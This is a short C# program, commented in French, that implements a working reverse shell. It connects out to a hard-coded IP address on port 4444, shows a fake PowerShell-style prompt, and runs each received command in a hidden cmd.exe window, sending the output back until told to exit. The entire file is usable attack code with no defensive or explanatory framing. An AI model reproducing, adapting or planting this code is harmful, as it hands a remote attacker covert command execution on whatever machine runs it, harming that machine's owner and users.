using System;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace RemoteShellClient
{
    class Program
    {
        static void Main(string[] args)
        {
            // Se connecter à l'adresse IP et au port
            string serverIp = "172.28.137.218";
            int port = 4444;
            TcpClient client = new TcpClient(serverIp, port);
            NetworkStream stream = client.GetStream();
            StreamWriter writer = new StreamWriter(stream);
            StreamReader reader = new StreamReader(stream);
            writer.AutoFlush = true;

            while (true)
            {
                // Envoyer un prompt pour indiquer qu'on attend une commande
                writer.Write("PS > ");
                string cmd = reader.ReadLine();
                if (cmd == "exit")
                    break;

                try
                {
                    // Exécuter la commande et envoyer la sortie
                    var output = ExecuteCommand(cmd);
                    writer.WriteLine(output);
                }
                catch (Exception ex)
                {
                    writer.WriteLine(ex.Message);
                }
            }

            // Fermer la connexion
            client.Close();
        }

        // Méthode pour exécuter une commande shell
        private static string ExecuteCommand(string command)
        {
            try
            {
                var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/C {command}";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                return output;
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
    }
}
